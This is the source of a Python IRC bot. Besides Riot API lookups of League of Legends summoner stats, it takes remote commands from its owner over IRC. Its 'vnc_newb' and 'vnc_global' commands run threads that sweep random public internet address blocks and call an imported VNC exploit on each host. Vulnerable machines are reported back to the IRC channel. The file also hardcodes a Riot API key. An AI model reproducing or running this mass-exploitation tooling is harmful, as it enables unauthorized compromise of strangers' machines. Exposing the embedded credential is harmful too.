# -*- coding: utf-8 -*-

from connection import Connection
from vnc_expl import newb_expl
from threading import Thread
import json
import random

from leagueoflegends import LeagueOfLegends
from leagueoflegends import RiotError

class Bot:
	END_OF_MOTDS = ['376', '422']
	PREFIX = 'v'
	TAG = '(vayne)'

	OWNERS = ['vayne']

	RIOT_API_KEY = '1201f800-aced-4abb-9083-714dcf58a36e'
	QUEUES = {
		'RANKED_SOLO_5x5': 'solo',
	}

	def __init__(self, nick):
		self.__connections = []
		self.__buffers = []
		self.__channels = []
		self.__threads = {}
		self.__vnc = {}
		self.__key = 0
		self.__nick = nick
		self.load_masks()

	def add_connection(self, sv, port):
		con = Connection(sv, port)
		self.__connections.append(con)
		self.__buffers.append('')

	def set_channels(self, channels):
		self.__channels = channels

	def connect(self):
		for con in self.__connections:
			if con.active:
				continue
			con.connect(self.__nick)
		self.work()
	
	@property
	def currcon(self):
		return self.__connections[self.__key]

	def printayne(self, msg, targets=None):
		self.currcon.msg('{0} ~ {1}'.format(self.TAG, msg), targets)

	def parse(self, data):
		print(data)
		source = ''
		line = ''
		if data.startswith(':'):
			source, line = data[1:].split(' ', 1)
		else:
			source = None
			p = data.split(' ')
			if p[0] == 'PING':
				self.currcon.write(('PONG', p[1]))
				print("PONG")
				return

		if ' :' in line:
			argstr, text = line.split(' :', 1)
		else:
			argstr, text = line, ''
		args = argstr.split(' ')

		if args[0] in self.END_OF_MOTDS:
			for channel in self.__channels:
				self.currcon.write(('JOIN', channel))
			return	

		if text:
			if text[0] == self.PREFIX and len(text.split(' ')) >= 2:
				print('CMD!')
				self.parse_cmd(text)

	def check_args(self, args, req):
		if len(args) < req:
			self.printayne('?', self.__channels)
			return False
		return True

	def add_jobs(self, key, jobs):
		if key not in self.__threads:
			self.__threads[key] = []
		for job in jobs:	
			self.__threads[key].append(job)

	def load_masks(self):
		vncf = open('vnc.json', 'r')
		vncj = json.load(vncf)
		self.__vnc['masks'] = vncj['masks']
		vncf.close()

	def update_masks(self):
		vncf = open('vnc.json', 'w')
		vncf.write(json.dumps(self.__vnc))
		vncf.close()

	def parse_cmd(self, cmd):
		args = cmd[2:].split(' ')
		if len(args) > 1:
			cmd, args = cmd[2:].split(' ', 1)
		else:
			cmd = args[0]
			args = ''
		args = args.split(' ')

		if (cmd == 'nick'):
			if not self.check_args(args, 1):
				return

			self.currcon.write(('NICK', args[0]))
		if (cmd == 'join'):
			if not self.check_args(args, 1):
				return
			self.currcon.write(('JOIN', args[0]))
		if (cmd == 'vnc_newb'):
			if not self.check_args(args, 1):
				return
			self.vnc_newb_expl_div(args[0])
			self.printayne('5 jobs now exploiting the mask {0}'.format(args[0]), self.__channels)
		if (cmd == 'vnc_global'):
			t = Thread(target=self.vnc_global, args=(args[0] == 'clean',))
			self.add_jobs('vnc', [t])
			t.start()
			self.printayne('global vnc scan initialized', self.__channels)
			self.update_masks()
		if (cmd == 'masks'):
			self.printayne('masks => {0}'.format(' - '.join(self.__vnc['masks'])), self.__channels)
		if (cmd == 'jobs'):
			ct = 0
			jobs = ''
			for k, v in self.__threads.iteritems():
				l = len(v)
				ct += l
				jobs += '{0}[{1}] '.format(k, l)
			self.printayne('currently running {0} jobs => {1}'.format(ct, jobs), self.__channels)
		if (cmd == 'stop'):
			if not self.check_args(args, 1):
				return
			if args[0] == 'all':
				self.__threads.clear()
				return
			if args[0] in self.__threads:
				del self.__threads[args[0]][:]
		if (cmd == 'summoner'):
			if not self.check_args(args, 2):
				return

			lol = self.lolit()
			lol.set_api_region(args[1])

			try:
				data = lol.get_summoner_by_name(args[0])
				s_name = data.iterkeys().next()
				s_data = data[s_name]
				s_id = s_data['id']
				s_level = s_data['summonerLevel']
				self.printayne('{0} => id {1} # level {2}'.format(s_name, s_id, s_level), self.__channels)
			except RiotError, e:
				self.printayne('riot error => {0}'.format(e.error_msg), self.__channels)

		if (cmd == 'soloq'):
			if not self.check_args(args, 2):
				return

			lol = self.lolit()
			lol.set_api_region(args[1])
			try:
				lol.set_summoner(args[0])
				data = lol.get_summoner_leagues_entry()
				print data

				for key, queue in data.items():
					if key in self.QUEUES:
						tier = data[key]['tier']
						name = data[key]['name']

						entry = data[key]['entries'][0]
						division = entry['division']
						wins = entry['wins']
						lp = entry['leaguePoints']
						ident = entry['playerOrTeamName'].encode('ascii', 'replace')

						self.printayne('{0} => tier {1} # division {2} # {3} wins # {4} league points'.format(ident, tier, division, wins, lp), self.__channels)
				
			except RiotError, e:
				self.printayne('riot error => {0}'.format(e.error_msg), self.__channels)

	def lolit(self):
		return LeagueOfLegends(self.RIOT_API_KEY)

	def random_mask(self):
		r_first = random.randint(0, 255)
		r_second = random.randint(0, 255)
		mask = '{0}.{1}'.format(r_first, r_second)
		return [r_first, r_second, mask]

	def vnc_newb_expl(self, mask, b, e):
		for i in xrange(b, e):
			for j in range(256):
				if ('vnc' in self.__threads and not self.__threads['vnc']) or 'vnc' not in self.__threads:
					return
				host = '{0}.{1}.{2}'.format(mask, i, j)
				if newb_expl(host):
					self.printayne('vnc vulnerable => {0}'.format(host), self.__channels)

	def vnc_newb_expl_div(self, mask, join=False):
		threads = []
		for i in range(5):
			b = i * 51
			e = b + 51
			threads.append(Thread(target=self.vnc_newb_expl, args=(mask, b, e)))
		
		[t.start() for t in threads]
		self.add_jobs('vnc', threads)
		if join:
			[t.join() for t in threads]

	def vnc_global(self, clean):
		if clean:
			self.__vnc['masks'] = []
		r_first, r_second, mask = self.random_mask()
		while True:
			if ('vnc' in self.__threads and not self.__threads['vnc']) or 'vnc' not in self.__threads:
					return
			#subnetworks in 192.168.x.x or between 172.16 and 172.31 are private so no need for scanning
			while mask in self.__vnc['masks'] or r_first == 10 or mask == '192.168' or (r_first == 172 and r_second >= 16 and r_second <= 31):
				r_first, r_second, mask = self.random_mask()
			self.vnc_newb_expl_div(mask, True)
			self.__vnc['masks'].append(mask)

	def work(self):
		while True:
			for key, con in enumerate(self.__connections):
				self.__buffers[self.__key] += con.socket.recv(1024)
				temp = self.__buffers[self.__key].split('\n')
				self.__buffers[self.__key] = temp.pop()
				
				for line in temp:
					clean = line.rstrip()
					self.__key = key
					self.parse(clean)

if __name__ == '__main__':
	bot = Bot('vayneluwl')
	bot.add_connection('google.root-network.org', 6667)
	bot.set_channels(['#vayne'])
	bot.connect()
